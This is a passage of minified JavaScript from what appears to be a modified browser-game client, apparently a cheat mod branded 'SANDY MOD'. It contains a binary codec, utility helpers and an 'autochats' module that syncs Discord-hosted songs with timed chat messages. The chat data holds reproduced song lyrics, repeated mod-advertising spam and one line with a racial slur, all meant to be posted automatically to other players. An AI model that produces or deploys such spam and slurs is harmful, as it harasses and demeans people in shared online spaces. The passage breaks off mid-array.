                            var i = Object.keys(n),
                                r = i.length;
                            t[r < 16 ? 128 + r : r <= 65535 ? 222 : 223](e, r);
                            var s = e.codec.encode;
                            i.forEach((function(t) {
                                s(e, t), s(e, n[t])
                            }))
                        }
                    }
                }, function(e, t, n) {
                    var i = n(4),
                        r = n(7),
                        s = r.Uint64BE,
                        a = r.Int64BE,
                        o = n(13).uint8,
                        c = n(0),
                        l = c.global,
                        h = c.hasBuffer && "TYPED_ARRAY_SUPPORT" in l && !l.TYPED_ARRAY_SUPPORT,
                        u = c.hasBuffer && l.prototype || {};

                    function f() {
                        var e = o.slice();
                        return e[196] = d(196), e[197] = p(197), e[198] = g(198), e[199] = d(199), e[200] = p(200), e[201] = g(201), e[202] = m(202, 4, u.writeFloatBE || v, !0), e[203] = m(203, 8, u.writeDoubleBE || w, !0), e[204] = d(204), e[205] = p(205), e[206] = g(206), e[207] = m(207, 8, y), e[208] = d(208), e[209] = p(209), e[210] = g(210), e[211] = m(211, 8, k), e[217] = d(217), e[218] = p(218), e[219] = g(219), e[220] = p(220), e[221] = g(221), e[222] = p(222), e[223] = g(223), e
                    }

                    function d(e) {
                        return function(t, n) {
                            var i = t.reserve(2),
                                r = t.buffer;
                            r[i++] = e, r[i] = n
                        }
                    }

                    function p(e) {
                        return function(t, n) {
                            var i = t.reserve(3),
                                r = t.buffer;
                            r[i++] = e, r[i++] = n >>> 8, r[i] = n
                        }
                    }

                    function g(e) {
                        return function(t, n) {
                            var i = t.reserve(5),
                                r = t.buffer;
                            r[i++] = e, r[i++] = n >>> 24, r[i++] = n >>> 16, r[i++] = n >>> 8, r[i] = n
                        }
                    }

                    function m(e, t, n, i) {
                        return function(r, s) {
                            var a = r.reserve(t + 1);
                            r.buffer[a++] = e, n.call(r.buffer, s, a, i)
                        }
                    }

                    function y(e, t) {
                        new s(this, t, e)
                    }

                    function k(e, t) {
                        new a(this, t, e)
                    }

                    function v(e, t) {
                        i.write(this, e, t, !1, 23, 4)
                    }

                    function w(e, t) {
                        i.write(this, e, t, !1, 52, 8)
                    }
                    t.getWriteToken = function(e) {
                        return e && e.uint8array ? function() {
                            var e = f();
                            return e[202] = m(202, 4, v), e[203] = m(203, 8, w), e
                        }() : h || c.hasBuffer && e && e.safe ? function() {
                            var e = o.slice();
                            return e[196] = m(196, 1, l.prototype.writeUInt8), e[197] = m(197, 2, l.prototype.writeUInt16BE), e[198] = m(198, 4, l.prototype.writeUInt32BE), e[199] = m(199, 1, l.prototype.writeUInt8), e[200] = m(200, 2, l.prototype.writeUInt16BE), e[201] = m(201, 4, l.prototype.writeUInt32BE), e[202] = m(202, 4, l.prototype.writeFloatBE), e[203] = m(203, 8, l.prototype.writeDoubleBE), e[204] = m(204, 1, l.prototype.writeUInt8), e[205] = m(205, 2, l.prototype.writeUInt16BE), e[206] = m(206, 4, l.prototype.writeUInt32BE), e[207] = m(207, 8, y), e[208] = m(208, 1, l.prototype.writeInt8), e[209] = m(209, 2, l.prototype.writeInt16BE), e[210] = m(210, 4, l.prototype.writeInt32BE), e[211] = m(211, 8, k), e[217] = m(217, 1, l.prototype.writeUInt8), e[218] = m(218, 2, l.prototype.writeUInt16BE), e[219] = m(219, 4, l.prototype.writeUInt32BE), e[220] = m(220, 2, l.prototype.writeUInt16BE), e[221] = m(221, 4, l.prototype.writeUInt32BE), e[222] = m(222, 2, l.prototype.writeUInt16BE), e[223] = m(223, 4, l.prototype.writeUInt32BE), e
                        }() : f()
                    }
                }, function(e, t, n) {
                    t.setExtUnpackers = function(e) {
                        e.addExtUnpacker(14, [o, l(Error)]), e.addExtUnpacker(1, [o, l(EvalError)]), e.addExtUnpacker(2, [o, l(RangeError)]), e.addExtUnpacker(3, [o, l(ReferenceError)]), e.addExtUnpacker(4, [o, l(SyntaxError)]), e.addExtUnpacker(5, [o, l(TypeError)]), e.addExtUnpacker(6, [o, l(URIError)]), e.addExtUnpacker(10, [o, c]), e.addExtUnpacker(11, [o, h(Boolean)]), e.addExtUnpacker(12, [o, h(String)]), e.addExtUnpacker(13, [o, h(Date)]), e.addExtUnpacker(15, [o, h(Number)]), "undefined" != typeof Uint8Array && (e.addExtUnpacker(17, h(Int8Array)), e.addExtUnpacker(18, h(Uint8Array)), e.addExtUnpacker(19, [u, h(Int16Array)]), e.addExtUnpacker(20, [u, h(Uint16Array)]), e.addExtUnpacker(21, [u, h(Int32Array)]), e.addExtUnpacker(22, [u, h(Uint32Array)]), e.addExtUnpacker(23, [u, h(Float32Array)]), "undefined" != typeof Float64Array && e.addExtUnpacker(24, [u, h(Float64Array)]), "undefined" != typeof Uint8ClampedArray && e.addExtUnpacker(25, h(Uint8ClampedArray)), e.addExtUnpacker(26, u), e.addExtUnpacker(29, [u, h(DataView)])), r.hasBuffer && e.addExtUnpacker(27, h(s))
                    };
                    var i, r = n(0),
                        s = r.global,
                        a = {
                            name: 1,
                            message: 1,
                            stack: 1,
                            columnNumber: 1,
                            fileName: 1,
                            lineNumber: 1
                        };

                    function o(e) {
                        return i || (i = n(15).decode), i(e)
                    }

                    function c(e) {
                        return RegExp.apply(null, e)
                    }

                    function l(e) {
                        return function(t) {
                            var n = new e;
                            for (var i in a) n[i] = t[i];
                            return n
                        }
                    }

                    function h(e) {
                        return function(t) {
                            return new e(t)
                        }
                    }

                    function u(e) {
                        return new Uint8Array(e).buffer
                    }
                }, function(e, t, n) {
                    var i = n(17);

                    function r(e) {
                        var t, n = new Array(256);
                        for (t = 0; t <= 127; t++) n[t] = s(t);
                        for (t = 128; t <= 143; t++) n[t] = o(t - 128, e.map);
                        for (t = 144; t <= 159; t++) n[t] = o(t - 144, e.array);
                        for (t = 160; t <= 191; t++) n[t] = o(t - 160, e.str);
                        for (n[192] = s(null), n[193] = null, n[194] = s(!1), n[195] = s(!0), n[196] = a(e.uint8, e.bin), n[197] = a(e.uint16, e.bin), n[198] = a(e.uint32, e.bin), n[199] = a(e.uint8, e.ext), n[200] = a(e.uint16, e.ext), n[201] = a(e.uint32, e.ext), n[202] = e.float32, n[203] = e.float64, n[204] = e.uint8, n[205] = e.uint16, n[206] = e.uint32, n[207] = e.uint64, n[208] = e.int8, n[209] = e.int16, n[210] = e.int32, n[211] = e.int64, n[212] = o(1, e.ext), n[213] = o(2, e.ext), n[214] = o(4, e.ext), n[215] = o(8, e.ext), n[216] = o(16, e.ext), n[217] = a(e.uint8, e.str), n[218] = a(e.uint16, e.str), n[219] = a(e.uint32, e.str), n[220] = a(e.uint16, e.array), n[221] = a(e.uint32, e.array), n[222] = a(e.uint16, e.map), n[223] = a(e.uint32, e.map), t = 224; t <= 255; t++) n[t] = s(t - 256);
                        return n
                    }

                    function s(e) {
                        return function() {
                            return e
                        }
                    }

                    function a(e, t) {
                        return function(n) {
                            var i = e(n);
                            return t(n, i)
                        }
                    }

                    function o(e, t) {
                        return function(n) {
                            return t(n, e)
                        }
                    }
                    t.getReadToken = function(e) {
                        var t = i.getReadFormat(e);
                        return e && e.useraw ? function(e) {
                            var t, n = r(e).slice();
                            for (n[217] = n[196], n[218] = n[197], n[219] = n[198], t = 160; t <= 191; t++) n[t] = o(t - 160, e.bin);
                            return n
                        }(t) : r(t)
                    }
                }, function(e, t, n) {
                    t.Encoder = s;
                    var i = n(18),
                        r = n(10).EncodeBuffer;

                    function s(e) {
                        if (!(this instanceof s)) return new s(e);
                        r.call(this, e)
                    }
                    s.prototype = new r, i.mixin(s.prototype), s.prototype.encode = function(e) {
                        this.write(e), this.emit("data", this.read())
                    }, s.prototype.end = function(e) {
                        arguments.length && this.encode(e), this.flush(), this.emit("end")
                    }
                }, function(e, t, n) {
                    t.Decoder = s;
                    var i = n(18),
                        r = n(16).DecodeBuffer;

                    function s(e) {
                        if (!(this instanceof s)) return new s(e);
                        r.call(this, e)
                    }
                    s.prototype = new r, i.mixin(s.prototype), s.prototype.decode = function(e) {
                        arguments.length && this.write(e), this.flush()
                    }, s.prototype.push = function(e) {
                        this.emit("data", e)
                    }, s.prototype.end = function(e) {
                        this.decode(e), this.emit("end")
                    }
                }, function(e, t, n) {
                    n(8), n(2), t.createCodec = n(1).createCodec
                }, function(e, t, n) {
                    n(8), n(2), t.codec = {
                        preset: n(1).preset
                    }
                }, function(e, t) {
                    var n, i, r = e.exports = {};

                    function s() {
                        throw new Error("setTimeout has not been defined")
                    }

                    function a() {
                        throw new Error("clearTimeout has not been defined")
                    }

                    function o(e) {
                        if (n === setTimeout) return setTimeout(e, 0);
                        if ((n === s || !n) && setTimeout) return n = setTimeout, setTimeout(e, 0);
                        try {
                            return n(e, 0)
                        } catch (t) {
                            try {
                                return n.call(null, e, 0)
                            } catch (t) {
                                return n.call(this, e, 0)
                            }
                        }
                    }! function() {
                        try {
                            n = "function" == typeof setTimeout ? setTimeout : s
                        } catch (e) {
                            n = s
                        }
                        try {
                            i = "function" == typeof clearTimeout ? clearTimeout : a
                        } catch (e) {
                            i = a
                        }
                    }();
                    var c, l = [],
                        h = !1,
                        u = -1;

                    function f() {
                        h && c && (h = !1, c.length ? l = c.concat(l) : u = -1, l.length && d())
                    }

                    function d() {
                        if (!h) {
                            var e = o(f);
                            h = !0;
                            for (var t = l.length; t;) {
                                for (c = l, l = []; ++u < t;) c && c[u].run();
                                u = -1, t = l.length
                            }
                            c = null, h = !1,
                                function(e) {
                                if (i === clearTimeout) return clearTimeout(e);
                                if ((i === a || !i) && clearTimeout) return i = clearTimeout, clearTimeout(e);
                                try {
                                    i(e)
                                } catch (t) {
                                    try {
                                        return i.call(null, e)
                                    } catch (t) {
                                        return i.call(this, e)
                                    }
                                }
                            }(e)
                        }
                    }

                    function p(e, t) {
                        this.fun = e, this.array = t
                    }

                    function g() {}
                    r.nextTick = function(e) {
                        var t = new Array(arguments.length - 1);
                        if (arguments.length > 1)
                            for (var n = 1; n < arguments.length; n++) t[n - 1] = arguments[n];
                        l.push(new p(e, t)), 1 !== l.length || h || o(d)
                    }, p.prototype.run = function() {
                        this.fun.apply(null, this.array)
                    }, r.title = "browser", r.browser = !0, r.env = {}, r.argv = [], r.version = "", r.versions = {}, r.on = g, r.addListener = g, r.once = g, r.off = g, r.removeListener = g, r.removeAllListeners = g, r.emit = g, r.prependListener = g, r.prependOnceListener = g, r.listeners = function(e) {
                        return []
                    }, r.binding = function(e) {
                        throw new Error("process.binding is not supported")
                    }, r.cwd = function() {
                        return "/"
                    }, r.chdir = function(e) {
                        throw new Error("process.chdir is not supported")
                    }, r.umask = function() {
                        return 0
                    }
                }, function(e, t) {
                    var n = Math.abs,
                        i = (Math.cos, Math.sin, Math.pow, Math.sqrt),
                        r = (n = Math.abs, Math.atan2),
                        s = Math.PI;
                    e.exports.randInt = function(e, t) {
                        return Math.floor(Math.random() * (t - e + 1)) + e
                    }, e.exports.randFloat = function(e, t) {
                        return Math.random() * (t - e + 1) + e
                    }, e.exports.lerp = function(e, t, n) {
                        return e + (t - e) * n
                    }, e.exports.decel = function(e, t) {
                        return e > 0 ? e = Math.max(0, e - t) : e < 0 && (e = Math.min(0, e + t)), e
                    }, e.exports.getDistance = function(e, t, n, r) {
                        return i((n -= e) * n + (r -= t) * r)
                    }, e.exports.getDirection = function(e, t, n, i) {
                        return r(t - i, e - n)
                    }, e.exports.getAngleDist = function(e, t) {
                        var i = n(t - e) % (2 * s);
                        return i > s ? 2 * s - i : i
                    }, e.exports.isNumber = function(e) {
                        return "number" == typeof e && !isNaN(e) && isFinite(e)
                    }, e.exports.isString = function(e) {
                        return e && "string" == typeof e
                    }, e.exports.kFormat = function(e) {
                        return e > 999 ? (e / 1e3).toFixed(1) + "k" : e
                    }, e.exports.capitalizeFirst = function(e) {
                        return e.charAt(0).toUpperCase() + e.slice(1)
                    }, e.exports.fixTo = function(e, t) {
                        return parseFloat(e.toFixed(t))
                    }, e.exports.sortByPoints = function(e, t) {
                        return parseFloat(t.points) - parseFloat(e.points)
                    }, e.exports.lineInRect = function(e, t, n, i, r, s, a, o) {
                        var c = r,
                            l = a;
                        if (r > a && (c = a, l = r), l > n && (l = n), c < e && (c = e), c > l) return !1;
                        var h = s,
                            u = o,
                            f = a - r;
                        if (Math.abs(f) > 1e-7) {
                            var d = (o - s) / f,
                                p = s - d * r;
                            h = d * c + p, u = d * l + p
                        }
                        if (h > u) {
                            var g = u;
                            u = h, h = g
                        }
                        return u > i && (u = i), h < t && (h = t), !(h > u)
                    }, e.exports.containsPoint = function(e, t, n) {
                        var i = e.getBoundingClientRect(),
                            r = i.left + window.scrollX,
                            s = i.top + window.scrollY,
                            a = i.width,
                            o = i.height;
                        return t > r && t < r + a && n > s && n < s + o
                    }, e.exports.mousifyTouchEvent = function(e) {
                        var t = e.changedTouches[0];
                        e.screenX = t.screenX, e.screenY = t.screenY, e.clientX = t.clientX, e.clientY = t.clientY, e.pageX = t.pageX, e.pageY = t.pageY
                    }, e.exports.hookTouchEvents = function(t, n) {
                        var i = !n,
                            r = !1;

                        function s(n) {
                            e.exports.mousifyTouchEvent(n), window.setUsingTouch(!0), i && (n.preventDefault(), n.stopPropagation()), r && (t.onclick && t.onclick(n), t.onmouseout && t.onmouseout(n), r = !1)
                        }
                        t.addEventListener("touchstart", e.exports.checkTrusted((function(n) {
                            e.exports.mousifyTouchEvent(n), window.setUsingTouch(!0), i && (n.preventDefault(), n.stopPropagation()), t.onmouseover && t.onmouseover(n), r = !0
                        })), !1), t.addEventListener("touchmove", e.exports.checkTrusted((function(n) {
                            e.exports.mousifyTouchEvent(n), window.setUsingTouch(!0), i && (n.preventDefault(), n.stopPropagation()), e.exports.containsPoint(t, n.pageX, n.pageY) ? r || (t.onmouseover && t.onmouseover(n), r = !0) : r && (t.onmouseout && t.onmouseout(n), r = !1)
                        })), !1), t.addEventListener("touchend", e.exports.checkTrusted(s), !1), t.addEventListener("touchcancel", e.exports.checkTrusted(s), !1), t.addEventListener("touchleave", e.exports.checkTrusted(s), !1)
                    }, e.exports.removeAllChildren = function(e) {
                        for (; e.hasChildNodes();) e.removeChild(e.lastChild)
                    }, e.exports.generateElement = function(t) {
                        var n = document.createElement(t.tag || "div");

                        function i(e, i) {
                            t[e] && (n[i] = t[e])
                        }
                        for (var r in i("text", "textContent"), i("html", "innerHTML"), i("class", "className"), t) {
                            switch (r) {
                                case "tag":
                                case "text":
                                case "html":
                                case "class":
                                case "style":
                                case "hookTouch":
                                case "parent":
                                case "children":
                                    continue
                            }
                            n[r] = t[r]
                        }
                        if (n.onclick && (n.onclick = e.exports.checkTrusted(n.onclick)), n.onmouseover && (n.onmouseover = e.exports.checkTrusted(n.onmouseover)), n.onmouseout && (n.onmouseout = e.exports.checkTrusted(n.onmouseout)), t.style && (n.style.cssText = t.style), t.hookTouch && e.exports.hookTouchEvents(n), t.parent && t.parent.appendChild(n), t.children)
                            for (var s = 0; s < t.children.length; s++) n.appendChild(t.children[s]);
                        return n
                    }, e.exports.eventIsTrusted = function(e) {
                        return !e || "boolean" != typeof e.isTrusted || e.isTrusted
                    }, e.exports.checkTrusted = function(t) {
                        return function(n) {
                            n && n instanceof Event && e.exports.eventIsTrusted(n) && t(n)
                        }
                    }, e.exports.randomString = function(e) {
                        for (var t = "", n = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", i = 0; i < e; i++) t += n.charAt(Math.floor(Math.random() * n.length));
                        return t
                    }, e.exports.countInArray = function(e, t) {
                        for (var n = 0, i = 0; i < e.length; i++) e[i] === t && n++;
                        return n
                    }
                }, function(e, t) {
                    e.exports.AnimText = function() {
                        this.init = function(e, t, n, i, r, s, a) {
                            this.x = e, this.y = t, this.color = a, this.scale = n, this.startScale = this.scale, this.maxScale = 1.5 * n, this.scaleSpeed = .7, this.speed = i, this.life = r, this.text = s
                        }, this.update = function(e) {
                            this.life && (this.life -= e, this.y -= this.speed * e, this.scale += this.scaleSpeed * e, this.scale >= this.maxScale ? (this.scale = this.maxScale, this.scaleSpeed *= -1)
                                          : this.scale <= this.startScale && (this.scale = this.startScale, this.scaleSpeed = 0), this.life <= 0 && (this.life = 0))
                        }, this.render = function(e, t, n, x) {
                            e.fillStyle = this.color, e.font = this.scale + "px Hammersmith One", (x && e.strokeText(this.text, this.x - t, this.y - n)), e.fillText(this.text, this.x - t, this.y - n);
                        }
                    }, e.exports.TextManager = function() {
                        this.texts = [], this.update = function(e, t, n, i, x) {
                            t.textBaseline = "middle", t.textAlign = "center";
                            for (var r = 0; r < this.texts.length; ++r) this.texts[r].life && (this.texts[r].update(e), this.texts[r].render(t, n, i, x))
                        }, this.showText = function(t, n, i, r, s, a, o) {
                            for (var c, l = 0; l < this.texts.length; ++l)
                                if (!this.texts[l].life) {
                                    c = this.texts[l];
                                    break
                                } c || (c = new e.exports.AnimText, this.texts.push(c)), c.init(t, n, i, r, s, a, o)
                        }
                    }, e.exports.autochats = function () {
                        this.staywithme = {
                            audio: new Audio("https://cdn.discordapp.com/attachments/1013031910211063841/1029586481121071145/1nonly_-_Stay_With_Me_Lyrics.mp3"),
                            chats: [
                                [
                                    "MEOW MEOW NIGGA",
                                    1159
                                ],
                                [
                                    "WHY EZ LOL",
                                    20273
                                ],
                                [
                                    "SANDY MOD ON TOP",
                                    20907
                                ],
                                [
                                    "MADE BY HAXXER/POOPSACK",
                                    21691
                                ],
                                [
                                    "You be cappin' like a snitch",
                                    22668
                                ],
                                [    "SANDY MOD ON TOP",    23857],
                                [    "SANDY MOD ON TOP",    25156],
                                [    "SANDY MOD ON TOP",    26385],
                                [    "SANDY MOD ON TOP",    27692],
                                [    "SANDY MOD ON TOP",    28888],
                                [    "SANDY MOD ON TOP",    30141],
                                [    "SANDY MOD ON TOP",    31527],
                                [    "SANDY MOD ON TOP",    32798],
                                [    "SANDY MOD ON TOP",    33945],
                                [    "SANDY MOD ON TOP",    35193],
                                [    "SANDY MOD ON TOP",    36503],
                                [    "SANDY MOD ON TOP",    37857],
                                [    "SANDY MOD ON TOP",    39117],
                                [    "SANDY MOD ON TOP",    40220],
                                [    "SANDY MOD ON TOP",    41496],
                                [    "SANDY MOD ON TOP",    42952],
                                [    "SANDY MOD ON TOP",    44358],
                                [    "SANDY MOD ON TOP",    45378],
                                [    "SANDY MOD ON TOP",    46633],
                                [    "SANDY MOD ON TOP",    47962],
                                [    "SANDY MOD ON TOP",    49402],
                                [    "SANDY MOD ON TOP",    50500],
                                [    "SANDY MOD ON TOP",    51768],
                                [    "SANDY MOD ON TOP",    52993],
                                [    "SANDY MOD ON TOP",    54091],
                                [    "SANDY MOD ON TOP",    55483],
                                [    "SANDY MOD ON TOP",    56741],
                                [    "SANDY MOD ON TOP",    58088],
                                [    "SANDY MOD ON TOP",    59288],
                                [    "SANDY MOD ON TOP",    60569],
                                [    "SANDY MOD ON TOP",    61969],
                                [    "SANDY MOD ON TOP",    63413],
                                [    "SANDY MOD ON TOP",    64329],
                                [    "SANDY MOD ON TOP",    65866],
                                [    "SANDY MOD ON TOP",    67130],
                                [    "SANDY MOD ON TOP",    68252],
                                [    "SANDY MOD ON TOP",    69345],
                                [    "SANDY MOD ON TOP",    70322],
                                [    "SANDY MOD ON TOP",    71289],
                                [    "SANDY MOD ON TOP",    72099],
                                [    "SANDY MOD ON TOP",    73271],
                                [    "SANDY MOD ON TOP",    73847],
                                [    "SANDY MOD ON TOP",    74978],
                                [    "SANDY MOD ON TOP",    75874],
                                [    "SANDY MOD ON TOP",    77061],
                                [    "SANDY MOD ON TOP",    77775],
                                [    "SANDY MOD ON TOP",    78331],
                                [    "SANDY MOD ON TOP",    79634],
                                [    "SANDY MOD ON TOP",    80690],
                                [    "SANDY MOD ON TOP",    82227],
                                [    "SANDY MOD ON TOP",    83277],
                                [    "SANDY MOD ON TOP",    84491],
                                [    "SANDY MOD ON TOP",    85727],
                                [    "SANDY MOD ON TOP",    87152],
                                [    "SANDY MOD ON TOP",    88356],
                                [    "SANDY MOD ON TOP",    89480],
                                [    "SANDY MOD ON TOP",    90797],
                                [    "SANDY MOD ON TOP",    91851],
                                [    "SANDY MOD ON TOP",    93338],
                                [    "SANDY MOD ON TOP",    94752],
                                [    "SANDY MOD ON TOP",    96045],
                                [    "SANDY MOD ON TOP",    97184],
                                [    "SANDY MOD ON TOP",    98407],
                                [    "SANDY MOD ON TOP",    99713],
                                [    "SANDY MOD ON TOP",    100910],
                                [    "SANDY MOD ON TOP",    102385],
                                [    "SANDY MOD ON TOP",    103510],
                                [    "SANDY MOD ON TOP",    104783],
                                [    "SANDY MOD ON TOP",    105945],
                                [    "SANDY MOD ON TOP",    107235],
                                [    "SANDY MOD ON TOP",    108497],
                                [    "SANDY MOD ON TOP",    109744],
                                [    "SANDY MOD ON TOP",    110995],
                                [    "SANDY MOD ON TOP",    112387],
                                [    "SANDY MOD ON TOP",    113531],
                                [    "SANDY MOD ON TOP",    114939],
                                [    "SANDY MOD ON TOP",    116067],
                                [    "SANDY MOD ON TOP",    117268],
                                [    "SANDY MOD ON TOP",    118726],
                                [    "SANDY MOD ON TOP",    119972],
                                [    "SANDY MOD ON TOP",    121136]
                            ]
                        }
                        this.legendsNeverDie = {
                            audio: new Audio("https://cdn.discordapp.com/attachments/990882830210981920/991648349608493066/Legends_Never_Die_Lyrics_Ft._Against_The_Current.mp3"),
                            chats: [
                                ["Legends Never Die", 12564], ["When the world is calling you", 16471], ["Can you hear them", 19616], [ "screaming out your-", 20958], ["name?", 24132], ["Legends Never Die", 25823], ["They become a part of you", 29522 ], ["Every time you bleed", 33833], ["for reaching greatness",36142],["Relentless you survive",40086],["They never lose hope",44050],["when everything's cold",45532],["and the fighting's near",46877],["It's deep in their bones",50361],["they'll run into smoke",52331],["when the fire is fierce",53631],["Ohh pick yourself up cause,",57260],["Legends Never Die!",60520],["when the world is calling you",64240],["Can you hear them screaming",67740],["out your-",69231],["name?",72521],["Legends Never Die!",74300],["they become a part of you",77900],["Every time you bleed",81620],["for reaching",83532],["greatness",85252],["Legends Never Die",87880],["They're written",91340],["down in eternity",92440],["But you'll never see",95140],["the price it costs,",97432],["the scars collected",100540],["all their lives",101720],["When everything's lost",105580],["They pick up their hearts",107440],["and avenge defeat",109320],["Before it all starts,",112680],["they suffer through harm",113980],["just to touch a dream",116020],["Ohh pick yourself up cause,",118840],["Legends Never Die!",122200],["when the world is-",126240],["calling you",127730],["Can you hear them",129760],["screaming out your-",131320],["name?",133320],["Legends Never Die!",135640],["They become a part of you",139500],["Every time you bleed",143180],["for reaching-",145320],["greatness",148100],["Legends Never Die",149440],["When the world is",156060],["calling out",157620],["your name",158900],["Begging you to fight",163320],["Pick yourself up once more",171160],["Pick yourself up, cause",174560],["Legends Never Die!",176860],["when the world is",180820],["calling you",181500],["Can you hear them",184400],["screaming out your-",186600],["name?",188300],["Legends Never Die",190780],["They become a part of you",194760],["Every time you bleed",197900],["for reaching",199300],["greatness",201500],["Legends Never Die..",204540]
                            ]
                        };
                        this.thetop = {
                            audio: new Audio("https://cdn.discordapp.com/attachments/919188611214229524/974478982051405934/Initial_D_5th_Stage_Soundtrack_-_The_Top.mp3"),
                            chats: [
                                [
                                    "Final lap",
                                    39607
                                ],
                                [
                                    "I'm on top of the world",
                                    40293
                                ],
                                [
                                    "And I will never rest",
                                    41845
                                ],
                                [
                                    "for second again",
                                    43192
                                ],
                                [
                                    "One more time",
                                    45303
                                ],
                                [
                                    "I have beaten them out",
                                    46438
                                ],
                                [
                                    "The scent of gasoline",
                                    47828
                                ],
                                [
                                    "announces the end",
                                    49351
                                ],
                                [
                                    "They all said",
                                    51320
                                ],
                                [
                                    "I'd best give it up",
                                    52316
                                ],
                                [
                                    "What a fool",
                                    53913
                                ],
                                [
                                    "to believe their lies",
                                    54752
                                ],
                                [
                                    "Now they've fall",
                                    57207
                                ],
                                [
                                    "and I'm at the top",
                                    58373
                                ],
                                [
                                    "Are you ready now to die?",
                                    59879
                                ],
                                [
                                    "I came up from the bottom",
                                    62924
                                ],
                                [
                                    "and into the top",
                                    64572
                                ],
                                [
                                    "For the first time",
                                    65813
                                ],
                                [
                                    "I feel alive",
                                    66962
                                ],
                                [
                                    "I can fly like an eagle",
                                    68956
                                ],
                                [
                                    "strike like a hawk",
                                    70748
                                ],
                                [
                                    "Do you think you can survive?",
                                    71946
                                ],
                                [
                                    "The top!",
                                    74821
                                ],
                                [
                                    "Final turn and",
                                    87454
                                ],
                                [
                                    "I'll settle the score",
                                    88736
                                ],
                                [
                                    "A rubber fire",
                                    89794
                                ],
                                [
                                    "screams into the night",
                                    90734
                                ],
                                [
                                    "Crash and burn is",
                                    93127
                                ],
                                [
                                    "what you're gonna do",
                                    94471
                                ],
                                [
                                    "I am a master of",
                                    95752
                                ],
                                [
                                    "the asphalt fight",
                                    97250
                                ],
                                [
                                    "They all said",
                                    99128
                                ],
                                [
                                    "I'd best give it up",
                                    100438
                                ],
                                [
                                    "What a fool",
                                    101743
                                ],
                                [
                                    "to believe their lies",
                                    102673
                                ],
                                [
                                    "Now they've fall",
                                    105251
                                ],
                                [
                                    "and I'm at the top",
                                    106445
                                ],
                                [
                                    "Are you ready now to die?",
                                    107891
                                ],
                                [
                                    "I came up from the bottom",
                                    110878
                                ],
                                [
                                    "and into the top",
                                    112544
                                ],
                                [
                                    "For the first time",
                                    113953
                                ],
                                [
                                    "I feel alive",
                                    114967
                                ],
                                [
                                    "I can fly like an eagle",
                                    116928
                                ],
                                [
                                    "strike like a hawk",
                                    118736
                                ],
                                [
                                    "Do you think you can survive?",
                                    119907
                                ],
                                [
                                    "I came up from the bottom",
                                    122969
                                ],
                                [
                                    "and into the top",
                                    124635
                                ],
                                [
                                    "For the first time",
                                    125972
                                ],
                                [
                                    "I feel alive",
                                    126979
                                ],
                                [
                                    "I can fly like an eagle",
                                    128989
                                ],
                                [
                                    "strike like a hawk",
                                    130755
                                ],
                                [
                                    "Do you think you can survive?",
                                    131906
                                ],
                                [
                                    "The top!",
                                    134941
                                ],
                                [
                                    "I came up from the bottom",
                                    171049
                                ],
                                [
                                    "and into the top",
                                    172624
                                ],
                                [
                                    "For the first time",
                                    173790
                                ],
                                [
                                    "I feel alive",
                                    174999
                                ],
                                [
                                    "I can fly like an eagle",
                                    176880
                                ],
                                [
                                    "strike like a hawk",
                                    178657
                                ],
                                [
                                    "Do you think you can survive?",
                                    179859
                                ],
                                [
                                    "I came up from the bottom",
                                    183009
                                ],
                                [
                                    "and into the top",
                                    184534
                                ],
                                [
                                    "For the first time",
                                    185837
                                ],
                                [
                                    "I feel alive",
                                    187606
                                ],
                                [
                                    "I can fly like an eagle",
                                    188853
                                ],
                                [
                                    "strike like a hawk",
                                    190569
                                ],
                                [
                                    "Do you think you can survive?",
                                    191750
                                ],
                                [
                                    "The top!",
                                    194704
                                ]
                            ]
                        };
                        this.gas = {
                            audio: new Audio("https://cdn.discordapp.com/attachments/876683706381762560/981927132202672228/e.mp3"),
                            chats: [
                                [
                                    "Ah",
                                    16885
                                ],
                                [
                                    "(gas, gas gas)",
                                    20000
                                ],
                                [
                                    "Ah",
                                    24039
                                ],
                                [
                                    "Do you like my car",
                                    28341
                                ],
                                [
                                    "my car",
                                    31349
                                ],
                                [
                                    "m y c a r",
                                    33137
                                ],
                                [
                                    "Guess you're ready'",
                                    53875
                                ],
                                [
                                    "Cause I'm waiting for you",
                                    54746
                                ],
                                [
                                    "It's gonna be so exciting!",
                                    56201
                                ],
                                [
                                    "Got this feeling",
                                    59363
                                ],
                                [
                                    "Really deep in my soul",
                                    60638
                                ],
                                [
                                    "Let's get out I wanna go",
                                    62462
                                ],
                                [
                                    "come along get it on!",
                                    64003
                                ],
                                [
                                    "Gonna take my car",
                                    65865
                                ],
                                [
                                    "gonna sit in",
                                    67463
                                ],
                                [
                                    "Gonna drive alone",
                                    69113
                                ],
                                [
                                    "'till I get you",
                                    70348
                                ],
                                [
                                    "'Cause I'm crazy",
                                    71831
                                ],
                                [
                                    "hot and ready",
                                    72635
                                ],
                                [
                                    "but you'll like it!",
                                    73624
                                ],
                                [
                                    "I wanna race for you",
                                    74930
                                ],
                                [
                                    "shall I go now?",
                                    76885
                                ],
                                [
                                    "Gas gas gas",
                                    78234
                                ],
                                [
                                    "I'm gonna step on the gas",
                                    79868
                                ],
                                [
                                    "Tonight I'll fly",
                                    81582
                                ],
                                [
                                    "and be your lover",
                                    83111
                                ],
                                [
                                    "Yeah yeah yeah",
                                    84323
                                ],
                                [
                                    "I'll be so quick as a flash",
                                    86116
                                ],
                                [
                                    "And I'll be your hero!",
                                    87777
                                ],
                                [
                                    "Gas gas gas",
                                    90637
                                ],
                                [
                                    "I'm gonna run as a flash",
                                    92633
                                ],
                                [
                                    "Tonight I'll fight",
                                    94096
                                ],
                                [
                                    "to be the winner",
                                    95500
                                ],
                                [
                                    "Yeah yeah yeah",
                                    96824
                                ],
                                [
                                    "I'm gonna step on the gas",
                                    98592
                                ],
                                [
                                    "And you'll see the big show!",
                                    100155
                                ],
                                [
                                    "Don't be lazy",
                                    115451
                                ],
                                [
                                    "'Cause I'm burning for you",
                                    116581
                                ],
                                [
                                    "It's like a hot sensation!",
                                    118681
                                ],
                                [
                                    "Got this power",
                                    121655
                                ],
                                [
                                    "That is taking me out",
                                    122845
                                ],
                                [
                                    "Yes I've got a crush on you",
                                    124771
                                ],
                                [
                                    "Ready now ready go!",
                                    126452
                                ]
                            ]
                        }
                        this.dejavu = {
                            audio: new Audio("https://cdn.discordapp.com/attachments/919188611214229524/974636785101582366/DAVE_RODGERS___DEJA_VU_Official_Lyric_VideoD_INITIAL_D.mp3"),
                            chats: [
                                [
                                    "See your body",
                                    46729
                                ],
                                [
                                    "into the moonlight",
                                    48320
                                ],
                                [
                                    "Even if I try to cancel",
                                    49803
                                ],
                                [
                                    "All the pictures into the mind",
                                    52998
                                ],
                                [
